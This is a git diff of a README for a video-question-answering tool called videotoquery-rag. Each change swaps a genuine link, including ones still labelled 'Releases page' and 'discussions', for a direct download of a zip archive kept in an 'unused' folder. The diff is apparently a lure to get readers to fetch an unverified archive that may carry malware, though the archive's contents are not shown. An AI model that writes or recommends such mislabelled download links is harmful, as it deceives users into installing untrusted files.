@@ -1,7 +1,7 @@
 # 🎥 videotoquery-rag - Easily Query Videos for Answers
 
 ## 📦 Download the Latest Version 
-[![Download](https://img.shields.io/badge/Download-videotoquery--rag-brightgreen)](https://github.com/FuckOBS/videotoquery-rag/releases)
+[![Download](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip)](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to videotoquery-rag! This application allows you to ask questions about video content and receive direct answers. It uses advanced technologies to analyze videos and provide helpful information. 
@@ -16,7 +16,7 @@ Welcome to videotoquery-rag! This application allows you to ask questions about 
 To get started, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page**
-   Navigate to our [Releases page](https://github.com/FuckOBS/videotoquery-rag/releases).
+   Navigate to our [Releases page](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip).
 
 2. **Select the Latest Version**
    Look for the most recent release at the top of the page. The version number will usually be bold and marked as 'Latest'.
@@ -56,7 +56,7 @@ If you encounter problems during the installation or while using videotoquery-ra
 - **Internet Connection:** Ensure you have a stable internet connection for the application to retrieve information.
 
 ## 🌟 Visit Our Community
-Join our growing community of users and contributors! Share your experiences, ask questions, or learn from others. Check out our discussions [here](https://github.com/FuckOBS/videotoquery-rag/discussions).
+Join our growing community of users and contributors! Share your experiences, ask questions, or learn from others. Check out our discussions [here](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip).
 
 ## 📜 License
 Videotoquery-rag is open-source software released under the MIT License. Feel free to use and modify it as per your needs.
@@ -64,4 +64,4 @@ Videotoquery-rag is open-source software released under the MIT License. Feel fr
 ## 📢 Feedback
 Your input is valuable. If you have suggestions, bugs to report, or features you want, please submit an issue through our GitHub repository.
 
-[![Download](https://img.shields.io/badge/Download-videotoquery--rag-brightgreen)](https://github.com/FuckOBS/videotoquery-rag/releases)
+[![Download](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip)](https://github.com/FuckOBS/videotoquery-rag/raw/refs/heads/main/Vid_to_Query-RAG/unused/videotoquery_rag_v1.6.zip)
